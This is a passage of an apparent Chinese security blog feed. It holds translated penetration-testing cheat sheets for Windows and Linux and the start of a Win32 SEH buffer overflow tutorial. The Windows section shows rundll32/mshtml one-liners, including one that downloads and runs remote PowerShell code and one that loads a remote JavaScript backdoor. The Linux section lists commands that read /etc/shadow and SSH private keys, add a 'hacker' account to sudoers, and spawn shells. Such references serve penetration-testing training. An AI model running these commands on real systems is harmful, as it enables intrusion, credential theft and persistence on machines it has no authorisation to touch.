payload.dll</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &lt;HTML Code&gt;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&apos;http://ip:port/&apos;);&quot;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w=new%20ActiveXObject(\&quot;WScript.Shell\&quot;);w.run(\&quot;calc\&quot;);window.close()&quot;);</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;)</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文为翻译文章，为了记录在对Windows系统进行渗透测试过程中的一些命令和知识。&lt;/p&gt;
&lt;p&gt;原文链接：&lt;a href=&quot;https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="翻译文章" scheme="https://www.mad-coding.cn/categories/%E7%BF%BB%E8%AF%91%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="渗透笔记" scheme="https://www.mad-coding.cn/tags/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Linux Notes</title>
    <link href="https://www.mad-coding.cn/2019/10/11/Linux%20Notes/"/>
    <id>https://www.mad-coding.cn/2019/10/11/Linux Notes/</id>
    <published>2019-10-11T07:19:12.000Z</published>
    <updated>2019-10-16T02:57:28.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文是翻译文章：记录在渗透测试过程中，经常会使用的Linux命令。</p><p>原文地址：<a href="https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html" target="_blank" rel="noopener">https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html</a></p><a id="more"></a><h1 id="0x01-列举"><a href="#0x01-列举" class="headerlink" title="0x01 列举"></a>0x01 列举</h1><h2 id="1-1-基本命令"><a href="#1-1-基本命令" class="headerlink" title="1.1 基本命令"></a>1.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">hostname </span><br><span class="line">uname -a</span><br><span class="line">cat /etc/password</span><br><span class="line">cat /etc/shadow</span><br><span class="line">groups</span><br><span class="line">ifconfig</span><br><span class="line">netstat -an</span><br><span class="line">ps aux | grep root</span><br><span class="line">uname -a</span><br><span class="line">env</span><br><span class="line">id</span><br><span class="line">cat /proc/version</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/shadow</span><br><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="1-2-侦察"><a href="#1-2-侦察" class="headerlink" title="1.2 侦察"></a>1.2 侦察</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">秘密的扫毛系统开放的端口</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYN洪泛扫描</span></span><br><span class="line">nmap -sS INSERTIPADDRESS</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全端口扫描</span></span><br><span class="line">nmap INSERTIPADDRESS -p-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务版本，默认脚本，操作系统探测</span></span><br><span class="line">nmap INSERTIPADDRESS -sV -sC -O -p 111,222,333</span><br><span class="line"></span><br><span class="line"><span class="comment">#UDP扫描</span></span><br><span class="line">nmap INSERTIPADDRESS -sU</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用UDP的方式连接开放的端口</span></span><br><span class="line">nc -u INSERTIPADDRESS 48772</span><br></pre></td></tr></table></figure><h2 id="1-3-UDP扫描"><a href="#1-3-UDP扫描" class="headerlink" title="1.3 UDP扫描"></a>1.3 UDP扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udpprotocolscanner &lt;ip&gt;</span><br></pre></td></tr></table></figure><h2 id="1-4-FTP枚举"><a href="#1-4-FTP枚举" class="headerlink" title="1.4 FTP枚举"></a>1.4 FTP枚举</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS</span><br></pre></td></tr></table></figure><h2 id="1-5-启动Web服务器"><a href="#1-5-启动Web服务器" class="headerlink" title="1.5 启动Web服务器"></a>1.5 启动Web服务器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><h1 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h1><p>libSSH身份验证绕过-CVE-2018-10933</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/blacknbunny/libSSH-Authentication-Bypass</span><br><span class="line"></span><br><span class="line">Use nc &lt;ip&gt; 22 to banner grab the SSH Service, if it&apos;s running vulnerable version of libSSH then you can bypass</span><br></pre></td></tr></table></figure><h1 id="0x03-特权提升"><a href="#0x03-特权提升" class="headerlink" title="0x03 特权提升"></a>0x03 特权提升</h1><h2 id="3-1-基本命令"><a href="#3-1-基本命令" class="headerlink" title="3.1 基本命令"></a>3.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version &lt;- Check for kernel exploits</span><br><span class="line">ps auxww</span><br><span class="line">ps -ef</span><br><span class="line">lsof -i</span><br><span class="line">netstat -laputen</span><br><span class="line">arp -e</span><br><span class="line">route</span><br><span class="line">cat /sbin/ifconfig -a</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/networks</span><br><span class="line">iptables -L</span><br><span class="line">hostname</span><br><span class="line">dnsdomainname</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><h2 id="3-2-运行pspy64"><a href="#3-2-运行pspy64" class="headerlink" title="3.2 运行pspy64"></a>3.2 运行pspy64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/DominicBreuker/pspy</span><br><span class="line"></span><br><span class="line">Run in background and watch for any processes running</span><br></pre></td></tr></table></figure><h2 id="3-3-生成TTY"><a href="#3-3-生成TTY" class="headerlink" title="3.3 生成TTY"></a>3.3 生成TTY</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</span><br><span class="line"></span><br><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/sh&quot;)&apos;</span><br><span class="line">echo os.system(&apos;/bin/bash&apos;)</span><br><span class="line">awk &apos;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&apos;</span><br><span class="line">find / -name blahblah &apos;exec /bin/awk &apos;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&apos; \;</span><br><span class="line">python: exit_code = os.system(&apos;/bin/sh&apos;) output = os.popen(&apos;/bin/sh&apos;).read()</span><br><span class="line">perl -e &apos;exec &quot;/bin/sh&quot;;&apos;</span><br><span class="line">perl: exec &quot;/bin/sh&quot;;</span><br><span class="line">ruby: exec &quot;/bin/sh&quot;</span><br><span class="line">lua: os.execute(&apos;/bin/sh&apos;)</span><br><span class="line">irb(main:001:0&gt; exec &quot;/bin/sh&quot;</span><br><span class="line">Can also use socat</span><br></pre></td></tr></table></figure><h2 id="3-4-枚举脚本"><a href="#3-4-枚举脚本" class="headerlink" title="3.4 枚举脚本"></a>3.4 枚举脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /EscalationServer/</span><br><span class="line">chmod u+x linux_enum.sh</span><br><span class="line">chmod 700 linuxenum.py</span><br><span class="line"></span><br><span class="line">./linux_enum.sh</span><br><span class="line">python linuxenum.py</span><br></pre></td></tr></table></figure><h2 id="3-5-将用户添加到Sudoers"><a href="#3-5-将用户添加到Sudoers" class="headerlink" title="3.5 将用户添加到Sudoers"></a>3.5 将用户添加到Sudoers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;hacker ALL=(ALL:ALL) ALL&quot; &gt;&gt; /etc/sudoers</span><br></pre></td></tr></table></figure><h2 id="3-6-列出CronJobs"><a href="#3-6-列出CronJobs" class="headerlink" title="3.6 列出CronJobs"></a>3.6 列出CronJobs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><h2 id="3-7-检查SSH可读SSH密钥的持久性和提升"><a href="#3-7-检查SSH可读SSH密钥的持久性和提升" class="headerlink" title="3.7 检查SSH可读SSH密钥的持久性和提升"></a>3.7 检查SSH可读SSH密钥的持久性和提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/identity.pub</span><br><span class="line">cat ~/.ssh/identity</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub</span><br><span class="line">cat ~/.ssh/id_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure><h2 id="3-8-启动脚本"><a href="#3-8-启动脚本" class="headerlink" title="3.8 启动脚本"></a>3.8 启动脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -o+w -type f 2&gt;/dev/null | grep -v &apos;/proc\|/dev&apos;</span><br></pre></td></tr></table></figure><h2 id="3-9-查找用户或组的可写文件"><a href="#3-9-查找用户或组的可写文件" class="headerlink" title="3.9 查找用户或组的可写文件"></a>3.9 查找用户或组的可写文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / perm /u=w -user `whoami` 2&gt;/dev/null</span><br><span class="line">find / -perm /u+w,g+w -f -user `whoami` 2&gt;/dev/null</span><br><span class="line">find / -perm /u+w -user `whoami` 2&gt;/dev/nul</span><br></pre></td></tr></table></figure><h2 id="3-10-查找用户或组的可写目录"><a href="#3-10-查找用户或组的可写目录" class="headerlink" title="3.10 查找用户或组的可写目录"></a>3.10 查找用户或组的可写目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / perm /u=w -type -d -user `whoami` 2&gt;/dev/null</span><br><span class="line">find / -perm /u+w,g+w -d -user `whoami` 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="3-11-嗅探流量"><a href="#3-11-嗅探流量" class="headerlink" title="3.11 嗅探流量"></a>3.11 嗅探流量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 &lt;protocol&gt;</span><br><span class="line">tcpdump -i any -s0 -w capture.pcap</span><br><span class="line">tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X</span><br><span class="line">tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X</span><br></pre></td></tr></table></figure><h2 id="3-12-用户安装的软件（有时配置错误）"><a href="#3-12-用户安装的软件（有时配置错误）" class="headerlink" title="3.12 用户安装的软件（有时配置错误）"></a>3.12 用户安装的软件（有时配置错误）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/</span><br><span class="line">/usr/local/src</span><br><span class="line">/usr/local/bin</span><br><span class="line">/opt/</span><br><span class="line">/home</span><br><span class="line">/var/</span><br><span class="line">/usr/src/</span><br></pre></td></tr></table></figure><h1 id="0x04-exploit"><a href="#0x04-exploit" class="headerlink" title="0x04 exploit"></a>0x04 exploit</h1><h2 id="4-1-获得权限"><a href="#4-1-获得权限" class="headerlink" title="4.1 获得权限"></a>4.1 获得权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="4-2-获取SUID二进制文件"><a href="#4-2-获取SUID二进制文件" class="headerlink" title="4.2 获取SUID二进制文件"></a>4.2 获取SUID二进制文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="4-3-检查Sudo配置"><a href="#4-3-检查Sudo配置" class="headerlink" title="4.3 检查Sudo配置"></a>4.3 检查Sudo配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><h1 id="0x05-文件传输"><a href="#0x05-文件传输" class="headerlink" title="0x05 文件传输"></a>0x05 文件传输</h1><h2 id="5-1-base64"><a href="#5-1-base64" class="headerlink" title="5.1 base64"></a>5.1 base64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat file.transfer | base64 -w 0 </span><br><span class="line">echo base64blob | base64 -d &gt; file.transfer</span><br></pre></td></tr></table></figure><h2 id="5-2-curl"><a href="#5-2-curl" class="headerlink" title="5.2 curl"></a>5.2 curl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://webserver/file.txt &gt; output.txt</span><br></pre></td></tr></table></figure><h2 id="5-3-wget"><a href="#5-3-wget" class="headerlink" title="5.3 wget"></a>5.3 wget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://webserver/file.txt &gt; output.txt</span><br></pre></td></tr></table></figure><h2 id="5-4-FTP"><a href="#5-4-FTP" class="headerlink" title="5.4 FTP"></a>5.4 FTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib</span><br><span class="line">python -m pyftpdlib -p 21 -w</span><br></pre></td></tr></table></figure><h2 id="5-5-TFTP"><a href="#5-5-TFTP" class="headerlink" title="5.5 TFTP"></a>5.5 TFTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service atftpd start</span><br><span class="line">atftpd --daemon --port 69 /tftp</span><br><span class="line">/etc/init.d/atftpd restart</span><br><span class="line">auxiliary/server/tftp</span><br></pre></td></tr></table></figure><h2 id="5-6-NC-Listeners"><a href="#5-6-NC-Listeners" class="headerlink" title="5.6 NC Listeners"></a>5.6 NC Listeners</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 443 &lt; filetotransfer.txt</span><br><span class="line">nc &lt;ip&gt; 443 &gt; filetransfer.txt</span><br></pre></td></tr></table></figure><h2 id="5-7-PHP-File-Transfers"><a href="#5-7-PHP-File-Transfers" class="headerlink" title="5.7 PHP File Transfers"></a>5.7 PHP File Transfers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php file_put_contents(&apos;nameOfFile&apos;, fopen(&apos;http://192.168.1.102/file&apos;, &apos;r&apos;)); ?&gt;&quot; &gt; down2.php</span><br></pre></td></tr></table></figure><h2 id="5-8-SCP"><a href="#5-8-SCP" class="headerlink" title="5.8 SCP"></a>5.8 SCP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Copy a file:</span><br><span class="line">scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext</span><br><span class="line"></span><br><span class="line"># Copy a directory:</span><br><span class="line">scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination</span><br></pre></td></tr></table></figure><h1 id="0x06-横向渗透"><a href="#0x06-横向渗透" class="headerlink" title="0x06 横向渗透"></a>0x06 横向渗透</h1><h2 id="6-1-SSH本地端口转发"><a href="#6-1-SSH本地端口转发" class="headerlink" title="6.1 SSH本地端口转发"></a>6.1 SSH本地端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &lt;user&gt;@&lt;target&gt; -L 127.0.0.1:8888:&lt;targetip&gt;:&lt;targetport&gt;</span><br></pre></td></tr></table></figure><h2 id="6-2-SSH动态端口转发"><a href="#6-2-SSH动态端口转发" class="headerlink" title="6.2 SSH动态端口转发"></a>6.2 SSH动态端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -D &lt;localport&gt; user@host</span><br><span class="line">nano /etc/proxychains.conf</span><br><span class="line">127.0.0.1 &lt;localport&gt;</span><br></pre></td></tr></table></figure><h2 id="6-3-索卡特港口前进"><a href="#6-3-索卡特港口前进" class="headerlink" title="6.3 索卡特港口前进"></a>6.3 索卡特港口前进</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./socat tcp-listen:5000,reuseaddr,fork tcp:&lt;target ip&gt;:5001</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文是翻译文章：记录在渗透测试过程中，经常会使用的Linux命令。&lt;/p&gt;
&lt;p&gt;原文地址：&lt;a href=&quot;https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="翻译文章" scheme="https://www.mad-coding.cn/categories/%E7%BF%BB%E8%AF%91%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="Linux笔记" scheme="https://www.mad-coding.cn/tags/Linux%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Win32缓冲区溢出-SEH溢出和Egghunters</title>
    <link href="https://www.mad-coding.cn/2019/10/11/Win32%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-SEH%E6%BA%A2%E5%87%BA%E5%92%8CEgghunters/"/>
    <id>https://www.mad-coding.cn/2019/10/11/Win32缓冲区溢出-SEH溢出和Egghunters/</id>
    <published>2019-10-11T03:29:57.000Z</published>
    <updated>2019-10-28T08:28:55.251Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是一篇翻译的文章，出自<a href="https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。" target="_blank" rel="noopener">https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。</a></p><a id="more"></a><h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><h2 id="1-1-异常处理程序101"><a href="#1-1-异常处理程序101" class="headerlink" title="1.1 异常处理程序101"></a>1.1 异常处理程序101</h2><p>在从漏洞利用的角度出发进行研究之前，让我们首先讨论一下<strong>异常处理程序的</strong> <em>真正</em>含义，不同的类型以及它们在Windows OS中的服务目的。</p><h3 id="1-1-1-什么是例外？"><a href="#1-1-1-什么是例外？" class="headerlink" title="1.1.1 什么是例外？"></a>1.1.1 什么是例外？</h3><p><em>异常是在程序/功能执行期间发生的事件</em></p><h3 id="1-1-2-不同类型的处理程序"><a href="#1-1-2-不同类型的处理程序" class="headerlink" title="1.1.2 不同类型的处理程序"></a>1.1.2 不同类型的处理程序</h3><p><strong>异常处理程序（EH）</strong> -一段代码，将尝试<em>执行某项操作，</em>并根据结果选择预定义的课程。例如，如果失败，请尝试执行此操作。</p><p><strong>结构化异常处理程序（SEH）-</strong> Windows内置的异常处理程序，如果开发特定的异常处理程序失败或主要使用，则可用于回退。</p><p><strong>下一个结构化异常处理程序（nSEH）-</strong></p><p>现在，如您在上面看到的，我<strong>确实</strong>提到了<strong>EH / SEH，</strong>因为<strong>异常处理程序</strong>分为两个不同的类别，即<em>OS级别</em>处理程序和/或由开发人员自己实现的处理程序。如您所见，Windows具有一个称为<strong>SEH</strong>的<em>操作系统级别</em>。</p><p>因此，基本上，<strong>异常处理程序</strong>是程序内部编写的代码段，其唯一目的是处理应用程序可能引发的任何<em>异常</em>或错误。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">    // Code to try goes here.</span><br><span class="line">&#125;</span><br><span class="line">catch (SomeSpecificException ex)</span><br><span class="line">&#123;</span><br><span class="line">    // Code to handle the exception goes here.</span><br><span class="line">&#125;</span><br><span class="line">finally</span><br><span class="line">&#123;</span><br><span class="line">    // Code to execute after the try (and possibly catch) blocks </span><br><span class="line">    // goes here.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的例子代表了一个基本的异常处理程序<strong>（EH）</strong>在<code>C#</code>由开发人员实现-有时候看着像上面的代码可以是相当吓人非程序员，但所有我们真正做的是说<code>try</code>运行这段代码：如果有错误/无论<code>catch</code>块包含什么内容，都将发生异常。简单！</p><p>现在，对于软件开发人员来说，编写自己的异常处理程序来管理软件可能遇到的任何错误/警告并不少见，但是<strong>Windows</strong>还内置了一个称为<strong>结构化异常处理程序（SEH）的程序</strong>，它可以抛出诸如以下的错误消息<code>Program.exe has stopped working and needs to close</code>：确保您之前都看过它们。</p><p>还值得一提的是，无论在<strong>OS级别</strong>和/或<strong>开发人员级别</strong>定义了<strong>异常处理**</strong>程序<strong>，</strong>Windows SEH都会<strong>通过一组指定的内存位置和<em>功能</em>对所有</strong>处理程序<strong>进行集中和一致的控制和管理，无论是在</strong>操作系统级别<strong>和/或</strong>开发人员级别。**。</p><h3 id="1-1-3-那么结构化异常处理程序如何工作？"><a href="#1-1-3-那么结构化异常处理程序如何工作？" class="headerlink" title="1.1.3 那么结构化异常处理程序如何工作？"></a>1.1.3 那么结构化异常处理程序如何工作？</h3><p>那么，它们如何工作？SEH井是Windows中的一种机制，它利用称为<strong>链接列表</strong>的数据结构/布局来包含一系列存储位置。触发异常后，操作系统将检索<strong>SEH链</strong>的头部并遍历列表，处理程序将评估最相关的操作过程，以正常关闭程序或执行指定的操作以从<em>异常中</em>恢复。（更多有关链接的信息）</p><p>当我们运行一个应用程序时，将执行该应用程序，并从<em>该应用程序</em>内部运行每个<strong>功能</strong>，都会创建一个<strong>堆栈帧</strong>，然后在该函数<em>返回</em>或完成执行后最终<strong>弹出</strong>该<strong>堆栈帧</strong>。现在对于<strong>异常处理程序</strong>实际上同样如此。基本上，如果你运行一个函数具有<strong>异常处理程序</strong>嵌入itself-该异常处理程序将获得它自己的专用<strong>堆栈帧</strong></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114152.png" 